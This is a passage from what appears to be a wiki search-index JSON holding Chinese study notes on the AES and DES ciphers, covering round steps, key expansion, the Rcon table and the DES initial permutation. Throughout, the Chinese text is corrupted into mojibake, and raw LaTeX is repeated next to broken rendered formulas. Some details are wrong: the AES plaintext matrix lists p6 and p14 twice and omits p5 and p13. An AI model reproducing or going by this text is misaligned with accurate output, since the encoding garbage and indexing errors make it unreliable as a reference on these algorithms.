Linuxä»é…ç½®æœ¬åœ°yumæºåˆ°å±€åŸŸç½‘å†…yumæºå…±äº«"},{"title":"AES","path":"/wiki/cryptography/AES.html","content":"å‚è€ƒç½‘å€ &lt;https://zhuanlan.zhihu.com/p/7891339&gt; æ€»ä½“æµç¨‹ AESåŠ å¯†æµç¨‹å›¾ï¼š æ˜æ–‡é•¿åº¦ä¸º128bit å¯†æ–‡é•¿åº¦ âˆˆ\\inâˆˆï½›128,192,256ï½bit ç»è¿‡AESåŠ å¯†åçš„å¯†æ–‡ä¸º128bit AESåŠ å¯†æµç¨‹{åˆå§‹è½®å¯†é’¥åŠ ï¼ˆAddRoundKeyï¼‰Nrâˆ’1è½®è¿­ä»£{å­—èŠ‚ä»£æ¢ï¼ˆByteSubï¼‰è¡Œç§»ä½ï¼ˆShiftRowï¼‰åˆ—æ··åˆï¼ˆMixColumnï¼‰è½®å¯†é’¥åŠ ï¼ˆAddRoundKeyï¼‰æœ€åä¸€è½®å˜æ¢{å­—èŠ‚ä»£æ¢ï¼ˆByteSubï¼‰è¡Œç§»ä½ï¼ˆShiftRowï¼‰å¯†é’¥åŠ ï¼ˆAddRoundKeyï¼‰ å…¶ä¸­æ¯è½®è½®å¯†é’¥åŠ çš„å¯†é’¥ç”±å¯†é’¥æ‹“å±•ç®—æ³•å¾—åˆ°AESåŠ å¯†æµç¨‹ \\begin{cases} åˆå§‹è½®å¯†é’¥åŠ ï¼ˆAddRoundKeyï¼‰\\\\[3ex] N_{r-1}è½®è¿­ä»£\\begin{cases}å­—èŠ‚ä»£æ¢ï¼ˆByteSubï¼‰\\\\ è¡Œç§»ä½ï¼ˆShiftRowï¼‰\\\\ åˆ—æ··åˆï¼ˆMixColumnï¼‰\\\\ è½®å¯†é’¥åŠ ï¼ˆAddRoundKeyï¼‰ \\end{cases}\\\\[3ex] æœ€åä¸€è½®å˜æ¢\\begin{cases}å­—èŠ‚ä»£æ¢ï¼ˆByteSubï¼‰\\\\ è¡Œç§»ä½ï¼ˆShiftRowï¼‰\\\\ å¯†é’¥åŠ ï¼ˆAddRoundKeyï¼‰\\end{cases} \\end{cases} \\ \\ å…¶ä¸­æ¯è½®è½®å¯†é’¥åŠ çš„å¯†é’¥ç”±å¯†é’¥æ‹“å±•ç®—æ³•å¾—åˆ° AESåŠ å¯†æµç¨‹â©âªâªâªâªâªâªâªâªâªâªâªâªâªâªâªâªâ¨âªâªâªâªâªâªâªâªâªâªâªâªâªâªâªâªâ§â€‹åˆå§‹è½®å¯†é’¥åŠ ï¼ˆAddRoundKeyï¼‰Nrâˆ’1â€‹è½®è¿­ä»£â©âªâªâªâªâ¨âªâªâªâªâ§â€‹å­—èŠ‚ä»£æ¢ï¼ˆByteSubï¼‰è¡Œç§»ä½ï¼ˆShiftRowï¼‰åˆ—æ··åˆï¼ˆMixColumnï¼‰è½®å¯†é’¥åŠ ï¼ˆAddRoundKeyï¼‰â€‹æœ€åä¸€è½®å˜æ¢â©âªâªâ¨âªâªâ§â€‹å­—èŠ‚ä»£æ¢ï¼ˆByteSubï¼‰è¡Œç§»ä½ï¼ˆShiftRowï¼‰å¯†é’¥åŠ ï¼ˆAddRoundKeyï¼‰â€‹â€‹ å…¶ä¸­æ¯è½®è½®å¯†é’¥åŠ çš„å¯†é’¥ç”±å¯†é’¥æ‹“å±•ç®—æ³•å¾—åˆ° AESåŠ å¯†è¿‡ç¨‹æè¿°å¦‚ä¸‹ï¼š åˆå§‹è½®å¯†é’¥åŠ ã€‚ç»™å®šä¸€ä¸ªæ˜æ–‡Må’Œç§å­å¯†é’¥K0K_0K0â€‹ï¼Œå°†å®ƒä»¬ä»¥çŸ©é˜µæ’åˆ—å¹¶è¿›è¡Œå¼‚æˆ–åŠ æ³•ï¼ˆå³åˆå§‹å¯†é’¥åŠ ï¼‰è¿ç®—ï¼› Nrâˆ’1N_{r-1}Nrâˆ’1â€‹è½®è¿­ä»£ã€‚å¯¹å‰Nrâˆ’1N_{r-1}Nrâˆ’1â€‹è½®ä¸­çš„æ¯ä¸€è½®ï¼Œä¾æ¬¡è¿›è¡Œå­—èŠ‚ä»£æ¢ï¼ˆByteSubï¼‰ã€è¡Œç§»ä½ï¼ˆShiftRowï¼‰ã€åˆ—æ··åˆï¼ˆMixColumnï¼‰ï¼Œè½®å¯†é’¥åŠ ï¼ˆAddRoundKeyï¼‰æ“ä½œ å…¶ä¸­ï¼Œè½®è¿­ä»£ä¸­çš„å¯†é’¥KiK_iKiâ€‹ç”±ç§å­å¯†é’¥K0K_0K0â€‹é€šè¿‡å¯†é’¥æ‰©å±•ç®—æ³•äº§ç”Ÿ æœ€åä¸€è½®å˜æ¢ã€‚æœ€åä¸€è½®ä¸­ä¸å‰é¢å„è½®ç¨æœ‰ä¸åŒï¼Œä¾æ¬¡å­—èŠ‚ä»£æ¢ï¼ˆByteSubï¼‰ã€è¡Œç§»ä½ï¼ˆShiftRowï¼‰ï¼Œè½®å¯†é’¥åŠ ï¼ˆAddRoundKey)ã€‚ AESæµç¨‹ç¬”è®°{å­—èŠ‚ä»£æ¢ï¼ˆByteSubï¼‰è¡Œç§»ä½ï¼ˆShiftRowï¼‰åˆ—æ··åˆï¼ˆMixColumnï¼‰è½®å¯†é’¥åŠ ï¼ˆAddRoundKeyï¼‰å¯†é’¥æ‹“å±•AESæµç¨‹ç¬”è®°\\begin{cases} å­—èŠ‚ä»£æ¢ï¼ˆByteSubï¼‰\\\\ è¡Œç§»ä½ï¼ˆShiftRowï¼‰\\\\ åˆ—æ··åˆï¼ˆMixColumnï¼‰\\\\ è½®å¯†é’¥åŠ ï¼ˆAddRoundKeyï¼‰\\\\ å¯†é’¥æ‹“å±•\\\\ \\end{cases} AESæµç¨‹ç¬”è®°â©âªâªâªâªâªâªâªâ¨âªâªâªâªâªâªâªâ§â€‹å­—èŠ‚ä»£æ¢ï¼ˆByteSubï¼‰è¡Œç§»ä½ï¼ˆShiftRowï¼‰åˆ—æ··åˆï¼ˆMixColumnï¼‰è½®å¯†é’¥åŠ ï¼ˆAddRoundKeyï¼‰å¯†é’¥æ‹“å±•â€‹ â€‹\tåœ¨Rijndaelçš„è®¾è®¡ä¸­ï¼Œå…¶ç®—æ³•çš„æ˜æ–‡åˆ†ç»„å’Œå¯†é’¥é•¿åº¦éƒ½æœ‰ä¸‰ä¸ªå¯é€‰å€¼ï¼Œåˆ†åˆ«ä¸º128ã€192å’Œ256bitï¼Œäº§ç”Ÿçš„å¯†æ–‡æ²¡æœ‰æ•°æ®æ‰©å±•ã€‚ä½†åœ¨AESä¸­ï¼Œæ˜æ–‡å’Œå¯†æ–‡é•¿åº¦å›ºå®šä¸º128bitï¼Œå¯†é’¥é•¿åº¦å¯ä½¿ç”¨128ã€192å’Œ256bitä¸‰è€…ä¸­çš„ä»»æ„ä¸€ç§ã€‚ â€‹\tæ˜æ–‡åŠåŠ å¯†è¿‡ç¨‹çš„ä¸­é—´ç»“æœéƒ½ç§°ä¸ºçŠ¶æ€Stateã€‚çŠ¶æ€Stateè¢«è¡¨ç¤ºæˆçŸ©é˜µï¼ŒçŸ©é˜µçš„æ¯ä¸ªå…ƒç´ æ˜¯ä¸€ä¸ªå­—èŠ‚ï¼Œå¹¶çœ‹æˆæ˜¯æœ‰é™åŸŸGF(282^828)ä¸­çš„ä¸€ä¸ªå…ƒç´ ï¼ŒçŸ©é˜µçš„è¡Œæ•°ä¸º4ï¼Œåˆ—æ•°NbN_bNbâ€‹ä¸º4 â€‹\tå¯†é’¥è¢«è¡¨ç¤ºæˆ4è¡ŒNkN_kNkâ€‹åˆ—çš„çŸ©é˜µ â€‹\tçŸ©é˜µåˆ—æ•°ç”±æ˜æ–‡é•¿åº¦orå¯†é’¥é•¿åº¦â—32bitç®—å‡º â€‹\tNrN_rNrâ€‹ï¼šåŠ å¯†è½®æ•° AESä¸åŒå¯†é’¥é•¿åº¦ä¸‹çš„Nbã€Nkã€NrN_bã€N_kã€N_rNbâ€‹ã€Nkâ€‹ã€Nrâ€‹ æ˜æ–‡åˆ†ç»„çŸ©é˜µåˆ—æ•°NbN_bNbâ€‹ï¼ˆæ˜æ–‡ä¸º128ï¼Œåˆ†ç»„é•¿åº¦æ˜¯32bitï¼Œæ‰€ä»¥128/32=4ï¼‰ å¯†é’¥çŸ©é˜µåˆ—æ•°NkN_kNkâ€‹ åŠ å¯†å’Œè§£å¯†è®ºæ•°NrN_rNrâ€‹ å¯†é’¥é•¿åº¦ä¸º128 4 4ï¼ˆ128/32=4ï¼‰ 10 192 4 6ï¼ˆ192/32=6ï¼‰ 12 256 4 8ï¼ˆ256/32=8ï¼‰ 14 è¯¦ç»†è¿‡ç¨‹ ä¸‹é¢ä»¥å¯†é’¥é•¿åº¦ä¸º128bitä¸ºä¾‹ï¼Œè®²è§£AESç®—æ³•å…·ä½“åŠ å¯†è¿‡ç¨‹ï¼š AESçš„å¤„ç†å•ä½æ˜¯å­—èŠ‚ã€‚ æ˜æ–‡çŸ©é˜µæ˜¯4è¡Œ4åˆ—ï¼Œå…±4*4=16ä¸ªå…ƒç´ ï¼ˆå­—èŠ‚ï¼‰ï¼Œè¾“å…¥çš„æ˜æ–‡åˆ†æˆ16ä¸ªå­—èŠ‚åï¼ŒæŒ‰ä»ä¸Šåˆ°ä¸‹ã€ä»å·¦è‡³å³çš„é¡ºåºï¼Œæ’æˆè¾“å…¥çŸ©é˜µï¼Œå¦‚ä¸‹æ‰€ç¤º [p0p4p8p12p1p6p9p14p2p6p10p14p3p7p11p15]\\begin{bmatrix} p_0 &amp; p_4 &amp; p_8 &amp; p_{12} \\\\ p_1 &amp; p_6 &amp; p_9 &amp; p_{14} \\\\ p_2 &amp; p_6 &amp; p_{10} &amp; p_{14} \\\\ p_3 &amp; p_7 &amp; p_{11} &amp; p_{15} \\\\ \\end{bmatrix} â£â¢â¢â¢â¡â€‹p0â€‹p1â€‹p2â€‹p3â€‹â€‹p4â€‹p6â€‹p6â€‹p7â€‹â€‹p8â€‹p9â€‹p10â€‹p11â€‹â€‹p12â€‹p14â€‹p14â€‹p15â€‹â€‹â¦â¥â¥â¥â¤â€‹ 1. å­—èŠ‚ä»£æ¢ï¼ˆByteSubï¼‰ å­—èŠ‚ä»£æ¢å±‚çš„ä¸»è¦åŠŸèƒ½å°±æ˜¯è®©è¾“å…¥çš„æ•°æ®é€šè¿‡S_boxè¡¨å®Œæˆä»ä¸€ä¸ªå­—èŠ‚åˆ°å¦ä¸€ä¸ªå­—èŠ‚çš„æ˜ å°„ï¼ˆæ˜¯å…³äºå­—èŠ‚çš„éçº¿æ€§å˜æ¢ï¼‰ï¼ŒSç›’çš„å…·ä½“è®¡ç®—æ–¹æ³•ä¸Šè¯¾æ²¡è®²ã€‚ æŠŠçŠ¶æ€çŸ©é˜µStateä¸­çš„å…ƒç´ å­—èŠ‚é«˜4ä½ä½œä¸ºè¡Œå€¼ï¼Œä½4ä½ä½œä¸ºåˆ—å€¼ï¼Œå–å‡ºSç›’ä¸­å¯¹åº”è¡Œåˆ—äº¤å‰ç‚¹çš„å…ƒç´ ä½œä¸ºè¾“å‡ºã€‚ AESçš„å­—èŠ‚ä»£æ¢è¡¨ï¼ˆæˆ–å«Sç›’ï¼‰å¦‚ä¸‹æ‰€ç¤ºï¼š åŠ å¯†å›¾ç¤ºï¼š 2. è¡Œç§»ä½ï¼ˆShiftRowï¼‰ åœ¨è¡Œç§»ä½å˜æ¢ä¸­ï¼ŒçŠ¶æ€çŸ©é˜µStateä¸­çš„æ¯ä¸€è¡Œå°†ä»¥å­—èŠ‚ä¸ºå•ä½ï¼Œå¾ªç¯å·¦ç§»ä¸åŒçš„ä½ç§»é‡ã€‚ â€‹\tStateçš„ç¬¬ä¸€è¡Œä¿æŒä¸å˜ï¼Œç¬¬äºŒè¡Œå¾ªç¯å·¦ç§»ä¸€ä¸ªå­—èŠ‚ï¼Œç¬¬ä¸‰è¡Œå¾ªç¯å·¦ç§»ä¸¤ä¸ªå­—èŠ‚ï¼Œç¬¬å››è¡Œå¾ªç¯å·¦ç§»ä¸‰ä¸ªå­—èŠ‚ã€‚ â€‹\tè¡Œä½ç§»æ“ä½œæœ€ä¸ºç®€å•ï¼Œå®ƒæ˜¯ç”¨æ¥å°†è¾“å…¥æ•°æ®ä½œä¸ºä¸€ä¸ª4Â·4çš„å­—èŠ‚çŸ©é˜µè¿›è¡Œå¤„ç†çš„ï¼Œç„¶åå°†è¿™ä¸ªçŸ©é˜µçš„å­—èŠ‚è¿›è¡Œä½ç½®ä¸Šçš„ç½®æ¢ã€‚ShiftRowså­å±‚å±äºAESæ‰‹åŠ¨çš„æ‰©æ•£å±‚ï¼Œç›®çš„æ˜¯å°†å•ä¸ªä½ä¸Šçš„å˜æ¢æ‰©æ•£åˆ°å½±å“æ•´ä¸ªçŠ¶æ€ï¼Œä»è€Œè¾¾åˆ°é›ªå´©æ•ˆåº”ã€‚ 3. åˆ—æ··åˆï¼ˆMixColumnï¼‰ â€‹\tåˆ—æ··åˆå˜æ¢å°†Stateä¹˜ä»¥ä¸€ä¸ªå›ºå®šçš„çŸ©é˜µAï¼Œå¯¹Stateé€åˆ—è¿›è¡Œå˜æ¢ï¼Œæ¯ä¸€åˆ—ä¸­çš„æ¯ä¸ªå­—èŠ‚è¢«å˜æ¢æˆä¸€ä¸ªæ–°å€¼ï¼Œç›´åˆ°4åˆ—éƒ½å˜æ¢å®Œæ¯•ã€‚ â€‹\tç›¸ä¹˜åå¾—åˆ°çš„ä¹˜ç§¯çŸ©é˜µï¼Œå…¶ä¸­æ¯ä¸ªå…ƒç´ å‡æ˜¯ä¸€è¡Œå’Œä¸€åˆ—ä¸­æ‰€å¯¹åº”å…ƒç´ çš„ä¹˜ç§¯ä¹‹å’Œã€‚è¿™é‡Œçš„ä¹˜æ³•å’ŒåŠ æ³•éƒ½æ˜¯å®šä¹‰åœ¨æœ‰é™åŸŸGF(282^828)ä¸Šçš„ã€‚ å›ºå®šçŸ©é˜µAï¼š [02030101010203010101020303010102]\\begin{bmatrix} 02 &amp; 03 &amp; 01 &amp; 01 \\\\ 01 &amp; 02 &amp; 03 &amp; 01 \\\\ 01 &amp; 01 &amp; 02 &amp; 03 \\\\ 03 &amp; 01 &amp; 01 &amp; 02 \\\\ \\end{bmatrix} â£â¢â¢â¢â¡â€‹02010103â€‹03020101â€‹01030201â€‹01010302â€‹â¦â¥â¥â¥â¤â€‹ â€‹ åˆ—æ··æ·†å­å±‚æ˜¯AESç®—æ³•ä¸­æœ€ä¸ºå¤æ‚çš„éƒ¨åˆ†ï¼Œå±äºæ‰©æ•£å±‚ï¼Œåˆ—æ··æ·†æ“ä½œæ˜¯AESç®—æ³•ä¸­ä¸»è¦çš„æ‰©æ•£å…ƒç´ ï¼Œå®ƒæ··æ·†äº†è¾“å…¥çŸ©é˜µçš„æ¯ä¸€åˆ—ï¼Œä½¿è¾“å…¥çš„æ¯ä¸ªå­—èŠ‚éƒ½ä¼šå½±å“åˆ°4ä¸ªè¾“å‡ºå­—èŠ‚ã€‚è¡Œä½ç§»å­å±‚å’Œåˆ—æ··æ·†å­å±‚çš„ç»„åˆä½¿å¾—ç»è¿‡ä¸‰è½®å¤„ç†ä»¥åï¼ŒçŸ©é˜µçš„æ¯ä¸ªå­—èŠ‚éƒ½ä¾èµ–äº16ä¸ªæ˜æ–‡å­—èŠ‚æˆå¯èƒ½ã€‚å…¶ä¸­åŒ…å«äº†çŸ©é˜µä¹˜æ³•ã€ä¼½ç½—ç“¦åŸŸå†…åŠ æ³•å’Œä¹˜æ³•çš„ç›¸å…³çŸ¥è¯†ã€‚ â€‹ 4. è½®å¯†é’¥åŠ ï¼ˆAddRoundKeyï¼‰ å¯†é’¥åŠ æ˜¯å°†è½®å¯†é’¥ KiK_iKiâ€‹ä¸çŠ¶æ€ State è¿›è¡Œé€æ¯”ç‰¹å¼‚æˆ–ã€‚ è½®å¯†é’¥KiK_iKiâ€‹ç”±ç§å­å¯†é’¥ K0K_0K0â€‹ é€šè¿‡å¯†é’¥æ‰©å±•ç®—æ³•å¾—åˆ°ã€‚ 5. å¯†é’¥æ‹“å±•ç®—æ³• ç”±å¯†é’¥æ‰©å±•ç®—æ³•å°†ç§å­å¯†é’¥æ‰©å±•æˆä¸ºæ‰©å±•å¯†é’¥çš„è®¡ç®—è¿‡ç¨‹å¦‚ä¸‹ï¼š W[i]={W[iâˆ’Nk]âŠ•temp (i mod Nk=0)W[iâˆ’Nk]âŠ•W[iâˆ’1](i mod Nkâ‰ 0)temp=SubByte(RotByte(W[iâˆ’1]))âŠ•Rcon[i]W[i]=\\begin{cases} W[i-N_k]âŠ•temp\\qquad\\ \\ \\ \\ \\ \\ (i\\;mod\\;N_k=0)\\\\[2ex] W[i-N_k]âŠ•W[i-1]\\qquad(i\\;mod\\;N_k e0)\\\\ \\end{cases}\\\\[4ex] temp=SubByte(RotByte(W[i-1]))âŠ•Rcon[i] W[i]=â©âªâ¨âªâ§â€‹W[iâˆ’Nkâ€‹]âŠ•temp (imodNkâ€‹=0)W[iâˆ’Nkâ€‹]âŠ•W[iâˆ’1](imodNkâ€‹î€ =0)â€‹temp=SubByte(RotByte(W[iâˆ’1]))âŠ•Rcon[i] tempé¦–å…ˆå°†4ä¸ªè¾“å…¥å­—èŠ‚è¿›è¡Œç¿»è½¬ï¼Œå¹¶æ‰§è¡Œä¸€ä¸ªæŒ‰å­—èŠ‚çš„Sç›’ä»£æ¢ï¼Œæœ€åç”¨ç¬¬ä¸€ä¸ªå­—èŠ‚ä¸è½®ç³»æ•°Rconè¿›è¡Œå¼‚æˆ–è¿ç®—ã€‚ ç›®çš„ï¼šä¸€æ˜¯å¢åŠ å¯†é’¥ç¼–æ’ä¸­çš„éçº¿æ€§ï¼›äºŒæ˜¯æ¶ˆé™¤AESä¸­çš„å¯¹ç§°æ€§ã€‚ è¿™ä¸¤ç§å±æ€§éƒ½æ˜¯æŠµæŠ—æŸäº›åˆ†ç»„å¯†ç æ”»å‡»å¿…è¦çš„ã€‚ å…¶ä¸­ï¼Œ RotByte()ï¼šå¾ªç¯å·¦ç§»ä¸€ä¸ªå­—èŠ‚ SubByte()ï¼šSç›’å­—èŠ‚ä»£æ¢ Rcon[i]ä¸ºè½®å¸¸æ•°ï¼Œå®šä¹‰ä¸ºï¼š Rcon[i]=(RC[i],00,00,00)å…¶ä¸­{RC[1]=1ï¼Œå³01RC[i]=xâ‹…RC[iâˆ’1]=xkâˆ’1,(iâ‰¥2)Rcon[i]=(RC[i],00,00,00)\\\\[2ex] å…¶ä¸­\\begin{cases}RC[1]=1ï¼Œå³01\\\\[2ex] RC[i]=x\\cdot RC[i-1]=x^{k-1},(i\\ge2) \\end{cases} Rcon[i]=(RC[i],00,00,00)å…¶ä¸­â©âªâ¨âªâ§â€‹RC[1]=1ï¼Œå³01RC[i]=xâ‹…RC[iâˆ’1]=xkâˆ’1,(iâ‰¥2)â€‹ â€‹\tå­—èŠ‚ç”¨åå…­è¿›åˆ¶è¡¨ç¤ºï¼ŒåŒæ—¶ä¸º GF(28)GF(2^8)GF(28)ä¸Šçš„å…ƒç´ . â€‹\tå…¶ä¸­ xiâˆ’1x_{i-1}xiâˆ’1â€‹ ä¸º GF(28)GF(2^8)GF(28)åŸŸä¸­çš„å¤šé¡¹å¼ x çš„ i-1æ¬¡æ–¹æ‰€å¯¹åº”çš„å­—èŠ‚ã€‚ â€‹ ç”±äº x å¯¹åº”çš„å­—èŠ‚ä¸º 02ï¼Œä¸Šå¼ä¹Ÿå¯ä»¥å†™ä¸º Rcon[i]=((02)iâˆ’1,00,00,00)Rcon[i]=((02)^{i-1},00,00,00) Rcon[i]=((02)iâˆ’1,00,00,00) Rcon[i]æ•°æ®è¡¨ï¼ˆç›´æ¥çœ‹è¿™ä¸ªè¡¨ï¼Œä¸Šé¢Rcon[i]çš„å®šä¹‰è¯¾ä¸Šæ²¡è®²ï¼‰ i 1 2 3 4 5 6 7 8 9 10 Rcon[i] 01000000 02000000 04000000 08000000 10000000 20000000 40000000 80000000 1b000000 36000000 AESå¯†é’¥å¤§è‡´æµç¨‹ï¼š â€‹\tå­å¯†é’¥çš„ç”Ÿæˆæ˜¯ä»¥åˆ—ä¸ºå•ä½è¿›è¡Œçš„ï¼Œä¸€åˆ—æ˜¯32Bitï¼Œå››åˆ—ç»„æˆå­å¯†é’¥å…±128Bitã€‚ç”Ÿæˆå­å¯†é’¥çš„æ•°é‡æ¯”AESç®—æ³•çš„è½®æ•°å¤šä¸€ä¸ªï¼Œå› ä¸ºç¬¬ä¸€ä¸ªå¯†é’¥åŠ æ³•å±‚è¿›è¡Œå¯†é’¥æ¼‚ç™½æ—¶ä¹Ÿéœ€è¦å­å¯†é’¥ã€‚ â€‹\tå¯†é’¥æ¼‚ç™½æ˜¯æŒ‡åœ¨AESçš„è¾“å…¥ç›’è¾“å‡ºä¸­éƒ½ä½¿ç”¨çš„å­å¯†é’¥çš„XORåŠ æ³•ã€‚ â€‹\tå­å¯†é’¥åœ¨å›¾ä¸­éƒ½å­˜å‚¨åœ¨W[0]ã€W[1]ã€â€¦ã€W[43]çš„æ‰©å±•å¯†é’¥æ•°ç»„ä¹‹ä¸­ã€‚ â€‹\tk1-k16è¡¨ç¤ºåŸå§‹å¯†é’¥å¯¹åº”çš„å­—èŠ‚ï¼Œè€Œå›¾ä¸­å­å¯†é’¥k0ä¸åŸå§‹å­å¯†é’¥ç›¸åŒã€‚ â€‹\tåœ¨ç”Ÿæˆçš„æ‰©å±•å¯†é’¥ä¸­Wçš„ä¸‹æ ‡å¦‚æœæ˜¯4çš„å€æ•°æ—¶(ä»é›¶å¼€å§‹)éœ€è¦å¯¹å¼‚æˆ–çš„å‚æ•°è¿›è¡ŒGå‡½æ•°å¤„ç†ã€‚ åœ¨åŠ å¯†æ—¶è¡Œä½ç§»å¤„ç†ä¸è§£å¯†æ—¶çš„å¤„ç†ç›¸åï¼Œæˆ‘ä»¬è¿™é‡Œå°†è§£å¯†æ—¶çš„å¤„ç†ç§°ä½œé€†è¡Œä½ç§»ã€‚å®ƒä¹‹æ‰€ä»¥ç§°ä½œè¡Œä½ç§»ï¼Œæ˜¯å› ä¸ºå®ƒåªåœ¨4Â·4çŸ©é˜µçš„è¡Œé—´è¿›è¡Œæ“ä½œï¼Œæ¯è¡Œ4å­—èŠ‚çš„æ•°æ®ã€‚åœ¨åŠ å¯†æ—¶ï¼Œä¿æŒçŸ©é˜µçš„ç¬¬ä¸€è¡Œä¸å˜ï¼Œç¬¬äºŒè¡Œå‘å·¦ç§»åŠ¨8Bit(ä¸€ä¸ªå­—èŠ‚)ã€ç¬¬ä¸‰è¡Œå‘å·¦ç§»åŠ¨2ä¸ªå­—èŠ‚ã€ç¬¬å››è¡Œå‘å·¦ç§»åŠ¨3ä¸ªå­—èŠ‚ã€‚è€Œåœ¨è§£å¯†æ—¶æ°æ°ç›¸åï¼Œä¾ç„¶ä¿æŒç¬¬ä¸€è¡Œä¸å˜ï¼Œå°†ç¬¬äºŒè¡Œå‘å³ç§»åŠ¨ä¸€ä¸ªå­—èŠ‚ã€ç¬¬ä¸‰è¡Œå³ç§»2ä¸ªå­—èŠ‚ã€ç¬¬å››è¡Œå³ç§»3ä¸ªå­—èŠ‚ã€‚æ“ä½œç»“æŸï¼"},{"title":"DES","path":"/wiki/cryptography/DES.html","content":"æ€»ä½“ä»‹ç» DESçš„ç»“æ„æ˜¯å…¸å‹çš„Feistelå¯†ç ç»“æ„ã€‚ DESç¬”è®°è„‰ç»œ{åˆå§‹ç½®æ¢IPè½®ç»“æ„{æ‰©å±•ç½®æ¢Eè½®å¯†é’¥Kiç”Ÿæˆè¿‡ç¨‹{ç½®æ¢é€‰æ‹©PC_1å¾ªç¯å·¦ç§»ç½®æ¢é€‰æ‹©PC_2Sç›’ä»£æ¢Pç›’ç½®æ¢é€†åˆå§‹ç½®æ¢IPâˆ’1DESç¬”è®°è„‰ç»œ \\begin{cases} åˆå§‹ç½®æ¢IP\\\\ è½®ç»“æ„\\begin{cases}æ‰©å±•ç½®æ¢E\\\\ è½®å¯†é’¥K_iç”Ÿæˆè¿‡ç¨‹\\begin{cases}ç½®æ¢é€‰æ‹©PC\\_1\\\\ å¾ªç¯å·¦ç§»\\\\ ç½®æ¢é€‰æ‹©PC\\_2\\end{cases}\\\\ Sç›’ä»£æ¢\\\\ Pç›’ç½®æ¢\\end{cases}\\\\ é€†åˆå§‹ç½®æ¢IP^{-1} \\end{cases} DESç¬”è®°è„‰ç»œâ©âªâªâªâªâªâªâªâªâªâªâªâªâªâªâ¨âªâªâªâªâªâªâªâªâªâªâªâªâªâªâ§â€‹åˆå§‹ç½®æ¢IPè½®ç»“æ„â©âªâªâªâªâªâªâªâªâªâ¨âªâªâªâªâªâªâªâªâªâ§â€‹æ‰©å±•ç½®æ¢Eè½®å¯†é’¥Kiâ€‹ç”Ÿæˆè¿‡ç¨‹â©âªâªâ¨âªâªâ§â€‹ç½®æ¢é€‰æ‹©PC_1å¾ªç¯å·¦ç§»ç½®æ¢é€‰æ‹©PC_2â€‹Sç›’ä»£æ¢Pç›’ç½®æ¢â€‹é€†åˆå§‹ç½®æ¢IPâˆ’1â€‹ æ˜æ–‡åˆ†ç»„é•¿ä¸º64bitã€‚ åˆå§‹å¯†é’¥ä¸º64bitï¼Œå…¶ä¸­ï¼Œç¬¬8ã€16ã€24ã€32ã€40ã€48ã€56ã€64ä¸ºå¥‡å¶æ£€éªŒä½ï¼Œå®é™…å¯†é’¥é•¿ä¸º56bitã€‚ è¯¦ç»†è¿‡ç¨‹ DESåŠ å¯†è¿‡ç¨‹ç”±ä¸‰ä¸ªé˜¶æ®µæ¥å®Œæˆï¼š é¦–å…ˆæ˜¯ä¸€ä¸ªåˆå§‹ç½®æ¢IP,ç”¨äºé‡æ’æ˜æ–‡åˆ†ç»„çš„64bitæ•°æ® ç„¶åæ˜¯å…·æœ‰ç›¸åŒåŠŸèƒ½çš„16è½®è¿­ä»£ï¼Œæ¯è½®ä¸­éƒ½æœ‰ç½®æ¢å’Œä»£æ¢è¿ç®—ï¼Œç¬¬16è½®å˜æ¢çš„è¾“å‡ºåˆ†ä¸ºå·¦å³ä¸¤åŠï¼Œå¹¶äº¤æ¢æ¬¡åº æœ€åå†ç»è¿‡ä¸€ä¸€ä¸ªé€†åˆå§‹ç½®æ¢IPâˆ’1IP^{-1}IPâˆ’1(IPçš„é€†)ä»è€Œäº§ç”Ÿ64bitçš„å¯†æ–‡ 1. åˆå§‹ç½®æ¢IP å¯¹64bitçš„æ˜æ–‡Mä¸­çš„å„ä½è¿›è¡Œæ¢ä½ï¼Œæ‰“ä¹±æ˜æ–‡ä¸­å„ä½çš„æ’åˆ—æ¬¡åºã€‚(å…¶å®IPå’ŒIPâˆ’1IP^{-1}IPâˆ’1åœ¨å¯†ç æ–¹é¢ä½œç”¨ä¸å¤§ï¼Œæ„ä¹‰åœ¨äºæ‰“ä¹±åŸæ¥è¾“å…¥æ˜æ–‡çš„ASCIIç å­—åˆ’åˆ†çš„å…³ç³»ã€‚ ç»è¿‡IPç½®æ¢ï¼Œæ˜æ–‡ä¸­åŸæœ‰çš„m58m_{58}m58â€‹æ”¾åœ¨ç¬¬1ä½ï¼Œm50m_{50}m50â€‹æ”¾åœ¨ç¬¬2ä½ï¼Œä¾æ­¤ç±»æ¨ï¼Œm7m_7m7â€‹æ”¾åœ¨ç¬¬64ä½ã€‚è¾“å…¥64bitçš„æ˜æ–‡M(m1,m2,m3â‹¯m64)M(m_1,m_2,m_3\\cdots m_{64})M(m1â€‹,m2â€‹,m3â€‹â‹¯m64â€‹)ï¼Œç»è¿‡IPç½®ä¸ºï¼š X(m58,m50,m42â‹¯m7)X(m_{58},m_{50},m_{42}\\cdots m_7) X(m58â€‹,m50â€‹,m42â€‹â‹¯m7â€‹) è¿™é‡ŒX=IP(M) åˆå§‹ç½®æ¢IPè¡¨8*8=64bit ç¬¬1åˆ— ç¬¬2åˆ— ç¬¬3åˆ— ç¬¬4åˆ— ç¬¬5åˆ— ç¬¬6åˆ— ç¬¬7åˆ— ç¬¬8åˆ— ç¬¬1è¡Œ 58 50 42 34 26 18 10 2 ç¬¬2è¡Œ 60 52 44 36 28 20 12 4 ç¬¬3è¡Œ 62 54 46 38 30 22 14 6 ç¬¬4è¡Œ 64 56 48 40 32 24 16 8 ç¬¬5è¡Œ 57 49 41 33 25 17 9 1 ç¬¬6è¡Œ 59 51 43 35 27 19 11 3 ç¬¬7è¡Œ 61 53 45 37 29 21 13 5 ç¬¬8è¡Œ 63 55 47 39 31 23 15 7 2. è½®ç»“æ„ â€‹\t64bitçš„æ˜æ–‡Mç»åˆå§‹IPç½®æ¢åï¼Œåˆ†æˆå·¦L0L_0L0â€‹å’Œå³R0R_0R0â€‹ä¸¤ä¸ª32bitçš„éƒ¨åˆ†ï¼Œç„¶åç»è¿‡16è½®è¿­ä»£åå†è¾“å‡ºã€‚ â€‹\tæ¯è½®è¿­ä»£çš„ç»“æ„å’ŒFeistelåŠ å¯†ç»“æ„ä¸€æ ·ï¼Œå¦‚ä¸Šå›¾4-5æ‰€ç¤ºã€‚å…¶æ•°å­¦å…¬å¼å¦‚ä¸‹ {Li=Riâˆ’1Ri=Liâˆ’1âŠ•F(Riâˆ’1,Ki)\\begin{cases} L_i=R_{i-1}\\\\ R_i=L_{i-1}âŠ•F(R_{i-1},K_i) \\end{cases} {Liâ€‹=Riâˆ’1â€‹Riâ€‹=Liâˆ’1â€‹âŠ•F(Riâˆ’1â€‹,Kiâ€‹)â€‹ å¼ä¸­ï¼š 